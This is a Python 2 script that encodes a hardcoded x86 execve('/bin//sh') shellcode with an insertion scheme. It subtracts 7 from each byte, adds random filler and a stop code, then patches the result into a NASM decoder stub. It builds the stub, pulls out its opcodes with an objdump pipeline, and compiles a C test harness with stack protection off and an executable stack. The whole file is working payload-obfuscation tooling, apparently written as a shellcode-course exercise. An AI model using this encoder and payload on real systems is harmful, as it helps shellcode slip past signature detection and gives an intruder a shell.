#!/usr/bin/python

# Python Insertion Encoder 
import random
import sys, os


def get_stop_code(shellcode):
	list_codes = bytearray(shellcode)
	min_number = min(list_codes)
	max_number = max(list_codes)
	stop_code = 0
	for i in range (max_number,min_number,-1):
			if i not in list_codes:
				stop_code = i
				break
	if stop_code is 0:
		print "You are using all opcodes, we can not use this encoding :/"
		sys.exit(1)
	return stop_code


def encode_shellcode(shellcode, hex_stop_code):
	encoded2 = ""
	for x in bytearray(shellcode) :	
		# Value 1: Encoded 'x'
		x = x - 7
		encoded2 += '0x'
		encoded2 += '%02x,' %x
		# Value 2: Random value != stop_code
		rand_number = random.randint(1,10)
		encoded2 += '0x%02x,' % rand_number
	encoded2 += '0x'+hex_stop_code+',0x'+hex_stop_code
	return encoded2


def create_new_file(hex_stop_code, encoded2):
	file_name = 'insertion-decoder.nasm'
	lines = open(file_name).read().splitlines()
	new_file_lines = []
	for l in lines:
		if l.endswith("marker1"):
			new_l = "	xor bl, 0x"
			new_l += hex_stop_code
			new_l += " ; marker1"
			new_file_lines.append(new_l)
		elif l.endswith("marker2"):
			new_l = "	EncodedShellcode: db "
			new_l += encoded2
			new_l += " ; marker2"
			new_file_lines.append(new_l)
		else:
			new_file_lines.append(l)
	open(file_name,'w').write('\n'.join(new_file_lines))

def compile(file_name):
	os.system("nasm -f elf32 -o "+file_name+".o "+file_name+".nasm")
	os.system("ld  -m elf_i386 -o "+file_name+" "+file_name+".o")
	os.system("rm "+file_name+".o")

def create_new_file_shellcode(shellcode):
	file_name = 'shellcode.c'
	lines = open(file_name).read().splitlines()
	new_file_lines = []
	for l in lines:
		if l.endswith("marker3"):
			new_l = ''
			new_l += shellcode
			new_l += '; // marker3'
			new_file_lines.append(new_l)
		else:
			new_file_lines.append(l)
	open(file_name,'w').write('\n'.join(new_file_lines))

	

def main():
	shellcode  = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
	stop_code = get_stop_code(shellcode)
	hex_stop_code = '{:02X}'.format(stop_code).lower()
	
	encoded2 = encode_shellcode(shellcode, hex_stop_code)
	create_new_file(hex_stop_code, encoded2)
	
	file_name = "insertion-decoder"
	compile(file_name)
	cmd = "objdump -d ./"+file_name+"|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/\"/'|sed 's/$/\"/g'"
	shellcode = os.popen(cmd).read().splitlines()[0]
	print ("Shellcode: \n"+shellcode)
	create_new_file_shellcode(shellcode)
	os.system("gcc -fno-stack-protector -z execstack shellcode.c -o shellcode 2>/dev/null")
	
main()